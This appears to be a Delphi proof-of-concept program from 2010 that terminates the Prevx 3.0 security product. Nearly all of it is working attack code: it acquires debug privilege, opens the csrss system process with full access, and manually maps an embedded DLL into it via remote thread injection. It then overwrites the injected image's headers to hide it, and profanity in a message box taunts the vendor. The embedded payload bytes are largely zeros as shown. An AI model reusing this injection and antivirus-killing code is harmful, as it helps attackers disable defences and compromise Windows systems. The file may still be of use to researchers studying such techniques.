    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $BD, $63, $05, $3D, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00
    );

  IMPORTED_NAME_OFFSET = $00000002;
  IMAGE_ORDINAL_FLAG32 = $80000000;
  IMAGE_ORDINAL_MASK32 = $0000FFFF;

type
  TDllEntryProc = function(hinstDLL: HMODULE; dwReason: dword;
    lpvReserved: pointer): boolean; stdcall;

  TSections = array[0..0] of TImageSectionHeader;

  PLibInfo = ^TLibInfo;
  TLibInfo = packed record
    ImageBase: pointer;
    ImageSize: longint;
    DllProc: TDllEntryProc;
    DllProcAddress: pointer;
  end;

  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: dword;
    SizeOfBlock: dword;
  end;

  PImageImportDescriptor = ^TImageImportDescriptor;
  TImageImportDescriptor = packed record
    OriginalFirstThunk: dword;
    TimeDateStamp: dword;
    ForwarderChain: dword;
    Name: dword;
    FirstThunk: dword;
  end;

function GetSectionProtection(ImageScn: dword): dword;
begin
  Result := 0;
  if (ImageScn and IMAGE_SCN_MEM_NOT_CACHED) <> 0 then
    Result := Result or PAGE_NOCACHE;
  if (ImageScn and IMAGE_SCN_MEM_EXECUTE) <> 0 then
  begin
    if (ImageScn and IMAGE_SCN_MEM_READ) <> 0 then
    begin
      if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
        Result := Result or PAGE_EXECUTE_READWRITE
      else Result := Result or PAGE_EXECUTE_READ;

    end
    else if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
      Result := Result or PAGE_EXECUTE_WRITECOPY
    else Result := Result or PAGE_EXECUTE;

  end
  else if (ImageScn and IMAGE_SCN_MEM_READ) <> 0 then
  begin
    if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
      Result := Result or PAGE_READWRITE
    else Result := Result or PAGE_READONLY;

  end
  else if (ImageScn and IMAGE_SCN_MEM_WRITE) <> 0 then
    Result := Result or PAGE_WRITECOPY
  else Result := Result or PAGE_NOACCESS;
end;

function InjectMemory(Process: dword; Memory: pointer; Size: dword): pointer;
var
  BytesWritten: dword;
begin
  result := nil;
  ZwAllocateVirtualMemory(Process, @result, 0, @Size, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (result <> nil) then
    ZwWriteVirtualMemory(Process, Result, Memory, Size, @BytesWritten);
end;

function InjectThread(Process: dword; Thread: pointer; Info: pointer;
  InfoLen: dword; Results: boolean): THandle;
var
  pThread, pInfo: pointer;
  BytesRead, TID: dword;
begin
  pInfo := InjectMemory(Process, Info, InfoLen);
  pThread := InjectMemory(Process, Thread, SizeOfProc(Thread));
  Result := CreateRemoteThread(Process, nil, 0, pThread, pInfo, 0, TID);
  if Results then
  begin
    ZwWaitForSingleObject(Result, false, nil);
    ZwReadVirtualMemory(Process, pInfo, Info, InfoLen, @BytesRead);
  end;
end;

function InjectString(Process: dword; Text: PChar): PChar;
var
  BytesWritten: dword;
  Size: DWORD;
begin
  result := nil;
  Size := strlenA(Text) + 1;
  BytesWritten := Size;
  ZwAllocateVirtualMemory(Process, @result, 0, @BytesWritten, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (result <> nil) then
    ZwWriteVirtualMemory(Process, Result, Text, Size, @BytesWritten);
end;

function GetProcAddressEx(Process: dword; lpModuleName,
  lpProcName: pchar; dwProcLen: dword): pointer;
type
  TGetProcAddrExInfo = record
    pExitThread: pointer;
    pGetProcAddress: pointer;
    pGetModuleHandle: pointer;
    lpModuleName: pointer;
    lpProcName: pointer;
  end;
var
  GetProcAddrExInfo: TGetProcAddrExInfo;
  BasicInformation: THREAD_BASIC_INFORMATION;
  hThread: dword;

  procedure GetProcAddrExThread(lpParameter: pointer); stdcall;
  var
    GetProcAddrExInfo: TGetProcAddrExInfo;
  begin
    GetProcAddrExInfo := TGetProcAddrExInfo(lpParameter^);
    asm
      push GetProcAddrExInfo.lpModuleName
      call GetProcAddrExInfo.pGetModuleHandle
      push GetProcAddrExInfo.lpProcName
      push eax
      call GetProcAddrExInfo.pGetProcAddress
      push eax
      call GetProcAddrExInfo.pExitThread
    end;
  end;

begin
  Result := nil;
  GetProcAddrExInfo.pGetModuleHandle := GetProcAddress(GetModuleHandleW(kernel32), 'GetModuleHandleA');
  GetProcAddrExInfo.pGetProcAddress := GetProcAddress(GetModuleHandleW(kernel32), 'GetProcAddress');
  GetProcAddrExInfo.pExitThread := GetProcAddress(GetModuleHandleW(kernel32), 'ExitThread');
  if dwProcLen = 4 then GetProcAddrExInfo.lpProcName := lpProcName else
    GetProcAddrExInfo.lpProcName := InjectMemory(Process, lpProcName, dwProcLen);

  GetProcAddrExInfo.lpModuleName := InjectString(Process, lpModuleName);
  hThread := InjectThread(Process, @GetProcAddrExThread, @GetProcAddrExInfo,
    SizeOf(GetProcAddrExInfo), False);

  if hThread <> 0 then
  begin
    ZwWaitForSingleObject(hThread, false, nil);
    memzero(@BasicInformation, sizeof(BasicInformation));
    ZwQueryInformationThread(hThread, ThreadBasicInformation, @BasicInformation, sizeof(BasicInformation), nil);
    result := pointer(BasicInformation.ExitStatus);
  end;
end;

function MapLibrary(Process: dword; Dest, Src: pointer): TLibInfo;
var
  ImageBase: pointer;
  ImageBaseDelta: integer;
  ImageNtHeaders: PImageNtHeaders;
  PSections: ^TSections;
  SectionLoop: integer;
  SectionBase: pointer;
  VirtualSectionSize, RawSectionSize: dword;
  OldProtect: dword;
  bytesIO: DWORD;
  Addr: PChar;
  NewLibInfo: TLibInfo;

  procedure ProcessRelocs(PRelocs: PImageBaseRelocation);
  var
    PReloc: PImageBaseRelocation;
    RelocsSize: dword;
    Reloc: PWord;
    ModCount: dword;
    RelocLoop: dword;
  begin
    PReloc := PRelocs;
    RelocsSize := ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    while dword(PReloc) - dword(PRelocs) < RelocsSize do
    begin
      ModCount := (PReloc.SizeOfBlock - Sizeof(PReloc^)) div 2;
      Reloc := pointer(dword(PReloc) + sizeof(PReloc^));
      for RelocLoop := 0 to ModCount - 1 do
      begin
        if Reloc^ and $F000 <> 0 then Inc(pdword(dword(ImageBase) +
            PReloc.VirtualAddress +
            (Reloc^ and $0FFF))^, ImageBaseDelta);
        Inc(Reloc);
      end;
      PReloc := pointer(Reloc);
    end;
  end;

  procedure ProcessImports(PImports: PImageImportDescriptor);
  var
    PImport: PImageImportDescriptor;
    Import: pdword;
    PImportedName: pchar;
    ProcAddress: pointer;
    PLibName: pchar;

    function IsImportByOrdinal(ImportDescriptor: dword): boolean;
    begin
      Result := (ImportDescriptor and IMAGE_ORDINAL_FLAG32) <> 0;
    end;

  begin
    PImport := PImports;
    while PImport.Name <> 0 do
    begin
      PLibName := pchar(dword(PImport.Name) + dword(ImageBase));

      if PImport.TimeDateStamp = 0 then
        Import := pdword(pImport.FirstThunk + dword(ImageBase))
      else
        Import := pdword(pImport.OriginalFirstThunk + dword(ImageBase));

      while Import^ <> 0 do
      begin
        if IsImportByOrdinal(Import^) then
          ProcAddress := GetProcAddressEx(Process, PLibName, PChar(Import^ and $FFFF), 4)
        else
        begin
          PImportedName := pchar(Import^ + dword(ImageBase) + IMPORTED_NAME_OFFSET);
          ProcAddress := GetProcAddressEx(Process, PLibName, PImportedName, strlenA(PImportedName));
        end;
        Ppointer(Import)^ := ProcAddress;
        Inc(Import);
      end;
      Inc(PImport);
    end;
  end;

begin
  ImageNtHeaders := pointer(dword(Src) + dword(PImageDosHeader(Src)._lfanew));

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
  ImageBase := Dest;
  ZwAllocateVirtualMemory(NtCurrentProcess, @ImageBase, 0, @bytesIO, MEM_RESERVE, PAGE_NOACCESS);

  ImageBaseDelta := dword(ImageBase) - ImageNtHeaders.OptionalHeader.ImageBase;

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  SectionBase := ImageBase;
  ZwAllocateVirtualMemory(NtCurrentProcess, @SectionBase, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);

  memcopy(SectionBase, Src, ImageNtHeaders.OptionalHeader.SizeOfHeaders);

  bytesIO := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  ZwProtectVirtualMemory(NtCurrentProcess, @SectionBase, @bytesIO, PAGE_READONLY, @OldProtect);

  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) +
    ImageNtHeaders.FileHeader.SizeOfOptionalHeader);

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    VirtualSectionSize := PSections[SectionLoop].Misc.VirtualSize;
    RawSectionSize := PSections[SectionLoop].SizeOfRawData;
    if VirtualSectionSize < RawSectionSize then
    begin
      VirtualSectionSize := VirtualSectionSize xor RawSectionSize;
      RawSectionSize := VirtualSectionSize xor RawSectionSize;
      VirtualSectionSize := VirtualSectionSize xor RawSectionSize;
    end;

    SectionBase := PSections[SectionLoop].VirtualAddress + pchar(ImageBase);
    bytesIO := VirtualSectionSize;
    ZwAllocateVirtualMemory(NtCurrentProcess, @SectionBase, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);

    memzero(SectionBase, VirtualSectionSize);
    memcopy(SectionBase, (pchar(src) + PSections[SectionLoop].pointerToRawData), RawSectionSize);
  end;

  NewLibInfo.DllProcAddress := pointer(ImageNtHeaders.OptionalHeader.AddressOfEntryPoint +
    dword(ImageBase));
  NewLibInfo.DllProc := TDllEntryProc(NewLibInfo.DllProcAddress);

  NewLibInfo.ImageBase := ImageBase;
  NewLibInfo.ImageSize := ImageNtHeaders.OptionalHeader.SizeOfImage;

  if ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <> 0
    then ProcessRelocs(pointer(ImageNtHeaders.OptionalHeader.
      DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].
      VirtualAddress + dword(ImageBase)));

  if ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress <> 0
    then ProcessImports(pointer(ImageNtHeaders.OptionalHeader.
      DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].
      VirtualAddress + dword(ImageBase)));

  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    bytesIO := PSections[SectionLoop].Misc.VirtualSize;
    Addr := PSections[SectionLoop].VirtualAddress + pchar(ImageBase);
    ZwProtectVirtualMemory(NtCurrentProcess, @Addr,
      @bytesIO, GetSectionProtection(PSections[SectionLoop].Characteristics), @OldProtect);
  end;
  Result := NewLibInfo;
end;

function memopen(Process: THANDLE; p: pointer; OldProtect: DWORD): BOOLEAN;
var
  bytesIO: DWORD;
  buf: pointer;
begin
  bytesIO := 4096;
  buf := p;
  result := (ZwProtectVirtualMemory(Process, @buf, @bytesIO, PAGE_EXECUTE_READWRITE, @OldProtect) = STATUS_SUCCESS);
end;

function memclose(Process: THANDLE; p: pointer; OldProtect: DWORD): BOOLEAN;
var
  pr, bytesIO: DWORD;
  buf: pointer;
begin
  bytesIO := 4096;
  buf := p;
  result := (ZwProtectVirtualMemory(Process, @buf, @bytesIO, OldProtect, @pr) = STATUS_SUCCESS);
end;

function InjectDllEx(Process: dword; Src: pointer): boolean;
type
  TDllLoadInfo = packed record
    Module: pointer;
    EntryPoint: pointer;
  end;
var
  Lib: TLibInfo;
  ImageNtHeaders: PImageNtHeaders;
  pModule: pointer;
  OldProtect: DWORD;
  BytesWritten: DWORD;
  Offset: DWORD;
  hThread: DWORD;
  bytesIO: DWORD;
  DllLoadInfo: TDllLoadInfo;

  procedure DllEntryPoint(lpParameter: pointer); stdcall;
  var
    LoadInfo: TDllLoadInfo;
  begin
    LoadInfo := TDllLoadInfo(lpParameter^);
    asm
      xor eax, eax
      push eax
      push DLL_PROCESS_ATTACH
      push LoadInfo.Module
      call LoadInfo.EntryPoint
    end;
  end;

begin
  Result := False;
  ImageNtHeaders := pointer(dword(Src) + dword(PImageDosHeader(Src)._lfanew));
  Offset := $10000000;
  repeat
    Inc(Offset, $10000);

    pModule := pointer(ImageNtHeaders.OptionalHeader.ImageBase + Offset);
    bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
    ZwAllocateVirtualMemory(NtCurrentProcess, @pModule, 0, @bytesIO, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (pModule <> nil) then
    begin
      bytesIO := 0;
      ZwFreeVirtualMemory(NtCurrentProcess, @pModule, @bytesIO, MEM_RELEASE);

      bytesIO := ImageNtHeaders.OptionalHeader.SizeOfImage;
      pModule := pointer(ImageNtHeaders.OptionalHeader.ImageBase + Offset);
      ZwAllocateVirtualMemory(Process, @pModule, 0, @bytesIO, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    end;
  until ((pModule <> nil) or (Offset > $30000000));
  Lib := MapLibrary(Process, pModule, Src);
  if Lib.ImageBase = nil then Exit;
  DllLoadInfo.Module := Lib.ImageBase;
  DllLoadInfo.EntryPoint := Lib.DllProcAddress;

  ZwWriteVirtualMemory(Process, pModule, Lib.ImageBase, Lib.ImageSize, @BytesWritten);

  hThread := InjectThread(Process, @DllEntryPoint, @DllLoadInfo,
    SizeOf(TDllLoadInfo), False);
  Result := (hThread <> 0);
  OldProtect := 0;
  if (Result) then
    if (memopen(Process, pModule, OldProtect)) then
    begin
      bytesIO := 512;
      memfill(@tmp2, sizeof(tmp2), $F);
      ZwWriteVirtualMemory(Process, pModule, @tmp2, bytesIO, @BytesWritten);
      memclose(Process, pModule, OldProtect);
    end;
end;

function ShowMessage(PStr: PWideChar; Buttons: DWORD): DWORD;
begin
  result := MessageBoxW(GetDesktopWindow(), PStr, 'UG North 2010 Fuzzers Pack', Buttons);
end;

function GetTargetProcessHandle(): THANDLE;
var
  attr: OBJECT_ATTRIBUTES;
  cid1: CLIENT_ID;
begin
  result := 0;
  cid1.UniqueProcess := CsrGetProcessId();
  cid1.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0, nil);
  if (ZwOpenProcess(@result, PROCESS_ALL_ACCESS, @attr, @cid1) <> STATUS_SUCCESS) then result := 0;
end;

function TargetIsRunning(): BOOLEAN; stdcall;
var
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  id1: THANDLE;
begin
  result := false;
  RtlInitUnicodeString(@str1, '\??\pxrts');
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenSymbolicLinkObject(@id1, SYMBOLIC_LINK_QUERY, @attr) = STATUS_SUCCESS) then
  begin
    result := true;
    ZwClose(id1);
  end;
end;

const
  String6: PWideChar = '\BaseNamedObjects\UnPrevxMeHarder';

var
  osver: OSVERSIONINFOEXW;
  hCsrss: THANDLE;
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  EventHandle: THANDLE;
begin
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then exit;

  if (MessageBoxW(GetDesktopWindow(), 'User mode proof-of-concept Prevx 3.0 kill'#13#10 +
    'Fucking handles/SSDT/Shadow SSDT will not help Prevx!'#13#13#10 +
    'Yes to continue, No to exit program'#13#10 +
    '(c) 2010 by EP_X0FF', Title, MB_YESNO) = IDNO) then exit;

  if (TargetIsRunning()) then
  begin
    if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
    begin
      hCsrss := GetTargetProcessHandle();
      if (hCsrss <> 0) then
      begin
        EventHandle := 0;
        RtlInitUnicodeString(@str1, String6);
        InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
        ZwCreateEvent(@EventHandle, EVENT_ALL_ACCESS, @attr, NotificationEvent, FALSE);
        if (EventHandle = 0) then
        begin
          ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr);
        end;
        if (EventHandle <> 0) then
        begin
          if InjectDllEx(hCsrss, @data) then
          begin
            if (ZwWaitForSingleObject(EventHandle, false, nil) = 0) then;
              ShowMessage('Terminated', MB_ICONINFORMATION);
          end;
          ZwClose(EventHandle);
        end;

      end;
    end;

  end else ShowMessage('Prevx not loaded, load it first =)', MB_ICONINFORMATION);
  ZwTerminateProcess(NtCurrentProcess, 0);
end.

